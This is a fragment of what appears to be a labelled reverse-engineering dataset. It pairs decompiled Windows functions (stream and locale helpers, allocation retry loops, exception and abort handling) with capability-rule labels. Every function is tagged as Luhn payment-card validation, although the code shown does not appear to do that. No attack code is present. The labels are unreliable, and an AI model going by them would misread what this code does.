        "decompiled_code": "\nint32_t * fcn.004a0de0(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    uint arg_10h;\n    int32_t *in_stack_fffffe98;\n    int32_t in_stack_fffffe9c;\n    int32_t *in_stack_fffffeb4;\n    int32_t *in_stack_fffffed0;\n    int32_t *in_stack_fffffeec;\n    int32_t *in_stack_ffffff08;\n    int32_t *in_stack_ffffff24;\n    int32_t *in_stack_ffffff40;\n    int32_t *in_stack_ffffff5c;\n    int32_t *in_stack_ffffff78;\n    int32_t *in_stack_ffffff94;\n    int32_t *in_stack_ffffffb0;\n    int32_t *in_stack_ffffffcc;\n    int32_t *in_stack_ffffffe8;\n    \n    uVar3 = fcn.00432500();\n    puVar1 = *param_1 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*param_1 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffffe8 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507604, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffffe8 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffffe8 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffffcc = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507624, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffffcc + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffffcc + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffffb0 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507644, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffffb0 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffffb0 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff94 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507664, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff94 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff94 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff78 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507670, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff78 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff78 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff5c = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50767c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff5c + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff5c + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff40 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50769c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff40 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff40 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff24 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5076bc, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff24 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff24 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff08 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5076c8, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff08 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff08 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffeec = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507700, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffeec + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffeec + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffed0 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50770c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffed0 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffed0 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffeb4 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507718, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffeb4 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffeb4 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe9c = 0x507724;\n        in_stack_fffffe98 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507724, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    if (in_stack_fffffe9c != 0) {\n        arg_10h = sub.msvcrt.dll_strlen(in_stack_fffffe9c);\n        fcn.0049e080(in_stack_fffffe98, in_stack_fffffe9c, arg_10h);\n        return in_stack_fffffe98;\n    }\n    fcn.0049c600(*(in_stack_fffffe98 + *(*in_stack_fffffe98 + -0xc) + 0x14) | 1);\n    return in_stack_fffffe98;\n}\n",
        "token_count": 2580
    },
    "004a0f00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.004a0f00(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    uint arg_10h;\n    int32_t *in_stack_fffffeec;\n    int32_t in_stack_fffffef0;\n    int32_t *in_stack_ffffff08;\n    int32_t *in_stack_ffffff24;\n    int32_t *in_stack_ffffff40;\n    int32_t *in_stack_ffffff5c;\n    int32_t *in_stack_ffffff78;\n    int32_t *in_stack_ffffff94;\n    int32_t *in_stack_ffffffb0;\n    int32_t *in_stack_ffffffcc;\n    int32_t *in_stack_ffffffe8;\n    \n    uVar3 = fcn.00432500();\n    puVar1 = *param_1 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*param_1 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffffe8 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507664, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffffe8 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffffe8 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffffcc = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507670, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffffcc + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffffcc + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffffb0 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50767c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffffb0 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffffb0 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff94 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50769c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff94 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff94 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff78 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5076bc, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff78 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff78 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff5c = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5076c8, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff5c + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff5c + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff40 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507700, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff40 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff40 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff24 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50770c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff24 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff24 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff08 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507718, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff08 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff08 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffef0 = 0x507724;\n        in_stack_fffffeec = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507724, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    if (in_stack_fffffef0 != 0) {\n        arg_10h = sub.msvcrt.dll_strlen(in_stack_fffffef0);\n        fcn.0049e080(in_stack_fffffeec, in_stack_fffffef0, arg_10h);\n        return in_stack_fffffeec;\n    }\n    fcn.0049c600(*(in_stack_fffffeec + *(*in_stack_fffffeec + -0xc) + 0x14) | 1);\n    return in_stack_fffffeec;\n}\n",
        "token_count": 2023
    },
    "004a0f60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.004a0f60(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    uint arg_10h;\n    int32_t *in_stack_ffffff08;\n    int32_t in_stack_ffffff0c;\n    int32_t *in_stack_ffffff24;\n    int32_t *in_stack_ffffff40;\n    int32_t *in_stack_ffffff5c;\n    int32_t *in_stack_ffffff78;\n    int32_t *in_stack_ffffff94;\n    int32_t *in_stack_ffffffb0;\n    int32_t *in_stack_ffffffcc;\n    int32_t *in_stack_ffffffe8;\n    \n    uVar3 = fcn.00432500();\n    puVar1 = *param_1 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*param_1 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffffe8 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507670, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffffe8 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffffe8 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffffcc = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50767c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffffcc + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffffcc + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffffb0 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50769c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffffb0 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffffb0 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff94 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5076bc, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff94 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff94 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff78 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5076c8, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff78 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff78 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff5c = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507700, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff5c + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff5c + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff40 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50770c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff40 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff40 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff24 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507718, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff24 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff24 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff0c = 0x507724;\n        in_stack_ffffff08 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507724, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    if (in_stack_ffffff0c != 0) {\n        arg_10h = sub.msvcrt.dll_strlen(in_stack_ffffff0c);\n        fcn.0049e080(in_stack_ffffff08, in_stack_ffffff0c, arg_10h);\n        return in_stack_ffffff08;\n    }\n    fcn.0049c600(*(in_stack_ffffff08 + *(*in_stack_ffffff08 + -0xc) + 0x14) | 1);\n    return in_stack_ffffff08;\n}\n",
        "token_count": 1836
    },
    "004a3500": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004a3500(int32_t param_1)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    \n    if (param_1 == 0) {\n        param_1 = 1;\n    }\n    while( true ) {\n        iVar1 = sub.msvcrt.dll_malloc(param_1);\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n        pcVar2 = fcn.0049df70();\n        if (pcVar2 == NULL) break;\n        (*pcVar2)();\n    }\n    puVar3 = fcn.004a3610(4);\n    *puVar3 = 0x50b59c;\n    iVar1 = 0x5076d4;\n    fcn.004a3bc0(puVar3, 0x5076d4, fcn.0049c330);\n    if (iVar1 == 0) {\n        iVar1 = 1;\n    }\n    while( true ) {\n        iVar4 = sub.msvcrt.dll_malloc(iVar1);\n        if (iVar4 != 0) {\n            return iVar4;\n        }\n        pcVar2 = fcn.0049df70();\n        if (pcVar2 == NULL) break;\n        (*pcVar2)();\n    }\n    return 0;\n}\n",
        "token_count": 303
    },
    "004a3750": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004a3750(uint32_t *param_1)\n\n{\n    uint uVar1;\n    char cVar2;\n    uint uVar3;\n    uint *puVar4;\n    uint uVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    code *pcVar8;\n    ulong uVar9;\n    int32_t iStack24;\n    \n    if ((param_1 == NULL) ||\n       (fcn.004a36d0(param_1),  iVar7 = param_1[1] + 0xb8b1aabc + (0x432b2aff < *param_1), \n       iVar7 != 0 || -iVar7 < (1 < *param_1 + 0xbcd4d500))) {\n        fcn.004a0230();\n    }\n    fcn.00428a40(param_1[-9]);\n    fcn.004a36d0(iStack24);\n    uVar5 = *(iStack24 + -0x18);\n    uVar1 = *(iStack24 + -0x24);\n    uVar3 = fcn.00428a60(*(iStack24 + -0x28));\n    fcn.004a36d0(uVar3);\n    fcn.004a3970();\n    while( true ) {\n        fcn.00428700();\n        cVar2 = fcn.004287e0(uVar5);\n        if (cVar2 != '\\0') break;\n        cVar2 = fcn.004287e0(uVar5);\n        if (cVar2 != '\\0') goto code_r0x004a4f72;\n        fcn.00428a40(uVar1);\n    }\n    fcn.004a3b60();\ncode_r0x004a4f72:\n    puVar4 = fcn.004a3610(4);\n    *puVar4 = 0x50a974;\n    fcn.004a3bc0(puVar4, 0x5071f8, 0x476a20);\n    uVar5 = sub.msvcrt.dll_abort();\n    fcn.004a36d0(uVar5);\n    uVar9 = sub.msvcrt.dll_abort();\n    fcn.004a3840();\n    pcVar8 = (uVar9 >> 0x20) + 1;\n    if (pcVar8 != NULL) {\n        fcn.0041b360(uVar9);\n    }\n    uVar9 = fcn.004a37a0();\n    uVar5 = uVar9;\n    if (uVar9 >> 0x20 != 1) goto code_r0x004a5051;\n    piVar6 = fcn.004a36d0(uVar5);\n    uVar5 = (**(*piVar6 + 8))();\n    uVar3 = (*pcVar8)(2);\n    sub.msvcrt.dll_fwrite(\"  what():  \", 1, 0xb, uVar3);\n    uVar3 = (*pcVar8)(2);\n    sub.msvcrt.dll_fputs(uVar5, uVar3);\n    uVar5 = (*pcVar8)(2);\n    sub.msvcrt.dll_fputc(10, uVar5);\n    fcn.004a3840();\n    do {\n        sub.msvcrt.dll_abort();\n        uVar5 = uVar1;\n        fcn.00427908(uVar1);\n        fcn.004a3b60();\ncode_r0x004a5051:\n        fcn.004a36d0(uVar5);\n        fcn.004a3840();\n    } while( true );\n}\n",
        "token_count": 803
    },
    "004a3950": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004a3950(void)\n\n{\n    fcn.0041cea0(0x4f74c4);\n    return;\n}\n",
        "token_count": 33
    },
    "004a3aa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.004a3aa0(uchar *param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint *unaff_EBX;\n    int32_t *unaff_EBP;\n    ulong uVar4;\n    uchar *in_stack_00000034;\n    int32_t in_stack_00000038;\n    uint uVar5;\n    \n    param_1[1] = 0;\n    *param_1 = 1;\n    piVar3 = *0x4f59f4;\n    if ((*0x4f59f4 == NULL) || (piVar3 = fcn.00418f30(*0x4f68a0),  piVar3 == NULL)) {\n        return piVar3;\n    }\n    uVar4 = fcn.0042a750();\n    if (uVar4 >> 0x20 == -1) {\n        fcn.004a37a0(uVar4);\n    }\n    uVar4 = fcn.0041b360();\n    if (uVar4 >> 0x20 != -1) {\n        fcn.0041b360(uVar4);\n    }\n    uVar4 = fcn.004a37a0();\n    if (uVar4 >> 0x20 != -1) {\n        fcn.0041b360(uVar4);\n    }\n    uVar4 = fcn.004a37a0();\n    if (uVar4 >> 0x20 != -1) {\n        fcn.0041b360(uVar4);\n    }\n    uVar4 = fcn.004a37a0();\n    if (uVar4 >> 0x20 != -1) {\n        fcn.0041b360(uVar4);\n    }\n    uVar4 = fcn.004a37a0();\n    if (uVar4 >> 0x20 != -1) {\n        fcn.0041b360(uVar4);\n    }\n    uVar4 = fcn.004a37a0();\n    if (uVar4 >> 0x20 != -1) {\n        fcn.0041b360(uVar4);\n    }\n    fcn.004a37a0();\n    *unaff_EBX = 0x50b174;\n    fcn.0048f380();\n    fcn.0041b360();\n    *unaff_EBX = 0x50b1a0;\n    fcn.0048f380();\n    fcn.0041b360();\n    fcn.004a34c0();\n    fcn.0041b360();\n    fcn.004a34c0();\n    fcn.0041b360();\n    *unaff_EBX = 0x50b174;\n    fcn.0048f380();\n    fcn.0041b360();\n    *unaff_EBX = 0x50b1a0;\n    fcn.0048f380();\n    uVar4 = fcn.0041b360();\n    if (uVar4 >> 0x20 != -1) {\n        fcn.0041b360(uVar4);\n    }\n    uVar4 = fcn.004a37a0();\n    if (uVar4 >> 0x20 != -1) {\n        fcn.0041b360(uVar4);\n    }\n    uVar4 = fcn.004a37a0();\n    uVar5 = uVar4;\n    if (uVar4 >> 0x20 != 1) {\ncode_r0x004a6176:\n        fcn.004a36d0(uVar5);\n        iVar2 = *(*unaff_EBP + -0xc);\n        puVar1 = unaff_EBP + iVar2 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(unaff_EBP + iVar2 + 0x10) & 1) != 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3840();\n        if (in_stack_00000038 < 1) {\n            iVar2 = unaff_EBP[1];\n        }\n        else {\n            *in_stack_00000034 = 0;\n            iVar2 = unaff_EBP[1];\n        }\n        if (iVar2 != 0) {\n            return unaff_EBP;\n        }\n        fcn.0049c600(*(unaff_EBP + *(*unaff_EBP + -0xc) + 0x14) | 4);\n        return unaff_EBP;\n    }\n    fcn.004a36d0(uVar5);\n    unaff_EBP = unaff_EBP + *(*unaff_EBP + -0xc);\n    unaff_EBP[5] = unaff_EBP[5] | 1;\n    if ((*(unaff_EBP + 4) & 1) != 0) {\n        fcn.004a3b60();\n        goto code_r0x004a6176;\n    }\n    piVar3 = fcn.004a3b60();\n    fcn.004a3840();\n    uVar4 = fcn.0041b360(piVar3);\n    uVar5 = uVar4;\n    if (uVar4 >> 0x20 == 1) {\n        fcn.004a36d0(uVar5);\n        piVar3 = piVar3 + *(*piVar3 + -0xc);\n        piVar3[5] = piVar3[5] | 1;\n        if ((*(piVar3 + 4) & 1) != 0) {\n            fcn.004a3b60();\n            goto code_r0x004a61fd;\n        }\n    }\n    else {\ncode_r0x004a61fd:\n        fcn.004a36d0(uVar5);\n        iVar2 = *(*piVar3 + -0xc);\n        puVar1 = piVar3 + iVar2 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(piVar3 + iVar2 + 0x10) & 1) == 0) goto code_r0x004686f6;\n        fcn.004a3b60();\n    }\n    piVar3 = fcn.004a3b60();\n    fcn.004a3840();\n    fcn.0041b360(piVar3);\ncode_r0x004686f6:\n    fcn.004a3840();\n    return piVar3;\n}\n",
        "token_count": 1450
    },
    "004a3b60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004a3b60(void)\n\n{\n    int32_t *piVar1;\n    int32_t extraout_EDX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    piVar1 = fcn.004a3950();\n    iVar2 = *piVar1;\n    piVar1[1] = piVar1[1] + 1;\n    if (iVar2 == 0) goto code_r0x004a3bb1;\n    iVar3 = *(iVar2 + 0x34) + -0x474e5544 + (0x432b2aff < *(iVar2 + 0x30));\n    if (iVar3 == 0 && (1 < *(iVar2 + 0x30) + 0xbcd4d500) <= -iVar3) goto code_r0x004a3bb6;\n    *piVar1 = 0;\n    do {\n        fcn.0041b400(iVar2 + 0x30);\n        fcn.004a36d0(iVar2 + 0x30);\ncode_r0x004a3bb1:\n        fcn.004a0230();\n        iVar2 = extraout_EDX;\ncode_r0x004a3bb6:\n        *(iVar2 + 0x14) = -*(iVar2 + 0x14);\n    } while( true );\n}\n",
        "token_count": 304
    },
    "004a3bc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
